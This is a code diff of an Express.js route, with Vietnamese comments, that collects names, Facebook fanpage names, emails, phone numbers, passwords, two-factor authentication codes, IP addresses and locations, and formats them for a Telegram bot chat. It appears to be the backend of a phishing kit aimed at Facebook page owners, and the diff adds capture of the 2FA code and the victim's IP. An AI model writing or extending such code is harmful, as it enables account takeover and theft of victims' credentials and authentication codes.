@@ -21,19 +21,22 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
 app.post('/api/user-info', async (req, res) => {
     const userInfo = req.body;
 
+    // Lấy IP từ body hoặc từ request headers/sockets nếu không có trong body
+    const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
     // Format thông tin thành chuỗi để gửi
     const message = `
 📧 *User Information Received*:
-- Email1: ${userInfo.email1}
-- User Name: ${userInfo.userName}
-- Email2: ${userInfo.email2}
-- Facebook Page: ${userInfo.facebookPage}
-- Phone: ${userInfo.phone}
-- First Password: ${userInfo.firstPassword}
-- Second Password: ${userInfo.secondPassword}
-- IP: ${userInfo.ip}
-- Country: ${userInfo.country}
-- City: ${userInfo.city}
+- Full Name: ${userInfo.fullName || ''}
+- Fanpage Name: ${userInfo.fanpageName || ''}
+- Business Email Address: ${userInfo.businessEmailAddress || ''}
+- Personal Email Address: ${userInfo.personalEmailAddress || ''}
+- Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
+- Password: ${userInfo.password || ''}
+- Code Authentication: ${userInfo.codeAuthentication || ''}
+- IP Address: ${ipAddress}
+- Country: ${userInfo.countryName || ''}
+- City: ${userInfo.cityName || ''}
     `;
 
     try {
